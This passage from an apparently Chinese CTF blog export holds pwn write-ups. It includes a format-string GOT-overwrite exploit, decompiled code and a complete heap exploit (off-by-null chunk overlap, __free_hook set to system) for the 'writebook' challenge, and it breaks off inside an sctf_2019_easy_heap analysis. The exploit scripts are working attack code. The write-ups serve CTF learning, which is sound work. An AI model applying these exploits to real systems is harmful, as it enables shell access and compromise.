class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%6$p %12$p&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">&quot;stack:&quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">libcbase = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)-(<span class="number">0xf7f77970</span>-<span class="number">0xf7d6e000</span>)</span><br><span class="line">print(<span class="string">&quot;libcbase:&quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]+libcbase</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">print(<span class="string">&quot;printf_got:&quot;</span>+<span class="built_in">hex</span>(printf_got))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack-<span class="number">0x4</span>)&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(printf_got&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack-<span class="number">0xc</span>)&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((printf_got+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b*0x080485AF&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s1 = system&amp;<span class="number">0xffff</span>   <span class="comment">#low</span></span><br><span class="line">s2 = (system&gt;&gt;<span class="number">16</span>)-s1 <span class="comment">#high</span></span><br><span class="line">print(<span class="built_in">hex</span>(s1)+<span class="string">&#x27;,&#x27;</span>+<span class="built_in">hex</span>(s2))</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(s1)+<span class="string">&#x27;c%9$hn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(s2)+<span class="string">&#x27;c%7$hn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 格式化字符串 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 格式化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用之off by null构造堆重叠(unsortedbin的double free)</title>
      <link href="/2021/11/13/off%20by%20null%E6%9E%84%E9%80%A0%E5%A0%86%E9%87%8D%E5%8F%A0(unsortedbin%E7%9A%84double%20free)/"/>
      <url>/2021/11/13/off%20by%20null%E6%9E%84%E9%80%A0%E5%A0%86%E9%87%8D%E5%8F%A0(unsortedbin%E7%9A%84double%20free)/</url>
      
        <content type="html"><![CDATA[<h2 id="深育杯的-writebook"><a href="#深育杯的-writebook" class="headerlink" title="深育杯的 writebook"></a>深育杯的 writebook</h2><h3 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h3><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_ABC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> size_4; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span> &amp;&amp; chunk_addr[<span class="number">2</span> * i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Buy a new book&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Write on one side?&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Write on both sides?&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size_4);</span><br><span class="line">        <span class="keyword">if</span> ( size_4 == <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( size_4 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">        <span class="keyword">if</span> ( size &gt; <span class="number">0x10F</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( size &lt;= <span class="number">0x1E0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v1 = <span class="number">2</span> * i;</span><br><span class="line">            chunk_addr[v1] = <span class="built_in">malloc</span>(size);</span><br><span class="line">            <span class="keyword">if</span> ( !chunk_addr[<span class="number">2</span> * i] )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">LABEL_11:</span><br><span class="line">            chunk_addr[<span class="number">2</span> * i + <span class="number">1</span>] = size;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;page #%d\n&quot;</span>, i);</span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;can you not write that much?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;don&#x27;t waste pages -.-&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p>off by null</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_E1D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Page: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">19</span> &amp;&amp; chunk_addr[<span class="number">2</span> * v1] )</span><br><span class="line">    sub_D6C(chunk_addr[<span class="number">2</span> * v1], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_addr[<span class="number">2</span> * v1 + <span class="number">1</span>]);<span class="comment">//off by null</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Page: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">19</span> &amp;&amp; chunk_addr[<span class="number">2</span> * v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)chunk_addr[<span class="number">2</span> * v1]);</span><br><span class="line">    chunk_addr[<span class="number">2</span> * v1] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Page: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">19</span> &amp;&amp; chunk_addr[<span class="number">2</span> * v1] )</span><br><span class="line">    <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)chunk_addr[<span class="number">2</span> * v1]);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./main&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.38.158&#x27;</span>,<span class="string">&#x27;2002&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add1</span>(<span class="params">size</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span>(<span class="params">size</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">page,con</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(page))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">page</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(page))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">page</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(page))</span><br><span class="line"></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#0</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#1</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#2</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#3</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#4</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#5</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#6</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#7 d</span></span><br><span class="line">add1(<span class="number">0x38</span>)<span class="comment">#8</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#9</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">dele(i)</span><br><span class="line">add1(<span class="number">0</span>)<span class="comment">#0   进入unsortedbin泄露地址</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))+<span class="number">0x7f797bec98e8</span>-<span class="number">0x7f797c2b5678</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0xe0</span>+<span class="number">0x40</span>))</span><br><span class="line">dele(<span class="number">9</span>)</span><br><span class="line">add1(<span class="number">0xd8</span>)<span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add1(<span class="number">0x38</span>)<span class="comment">#2</span></span><br><span class="line">add1(<span class="number">0x30</span>)<span class="comment">#3</span></span><br><span class="line">dele(<span class="number">3</span>)<span class="comment">#为了让0x40大小的tcabin多一个chunk以申请出free_hook</span></span><br><span class="line">dele(<span class="number">8</span>)<span class="comment">#2与8重叠</span></span><br><span class="line">edit(<span class="number">2</span>,p64(libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))<span class="comment">#将free_hook写入tcabin</span></span><br><span class="line">print(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add1(<span class="number">0x38</span>)<span class="comment">#3</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add1(<span class="number">0x38</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,p64(libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]))<span class="comment">#将free_hook改为system</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">chunk 0x000000000202060</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="sctf-2019-easy-heap"><a href="#sctf-2019-easy-heap" class="headerlink" title="sctf_2019_easy_heap"></a>sctf_2019_easy_heap</h2><h3 id="主要函数-1"><a href="#主要函数-1" class="headerlink" title="主要函数"></a>主要函数</h3><h4 id="sub-CD0"><a href="#sub-CD0" class="headerlink" title="sub_CD0"></a>sub_CD0</h4><p>main 最开始给的函数</p><p>mmap 了一段很大的内存，并给出了它的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_CD0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 buf; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(chunk_addr, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  read(fd, &amp;buf, <span class="number">5uLL</span>);</span><br><span class="line">  buf &amp;= <span class="number">0xFFFFFFF000</span>uLL;</span><br><span class="line">  close(fd);</span><br><span class="line">  v3 = mmap((<span class="keyword">void</span> *)buf, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Mmap: %p\n&quot;</span>, v3);</span><br><span class="line">  count[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  sub_CBD();</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="add-1"><a href="#add-1" class="headerlink" title="add"></a>add</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_F89</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; chunk_addr[<span class="number">2</span> * i + <span class="number">1</span>]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No more space.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  size = sub_EE5();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x1000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid size!&quot;</span>);</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;Memory allocate failed!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  chunk_addr[<span class="number">2</span> * i + <span class="number">1</span>] = v2;</span><br><span class="line">  chunk_addr[<span class="number">2</span> * i] = size;</span><br><span class="line">  ++count[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;chunk at [%d] Pointer Address %p\n&quot;</span>, i, &amp;chunk_addr[<span class="number">2</span> * i + <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="delete-1"><a href="#delete-1" class="headerlink" title="delete"></a>delete</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_10C2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v2 = sub_EE5();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> &amp;&amp; *((_QWORD *)&amp;chunk_addr + <span class="number">2</span> * v2 + <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;chunk_addr + <span class="number">2</span> * v2 + <span class="number">1</span>));</span><br><span class="line">    *((_QWORD 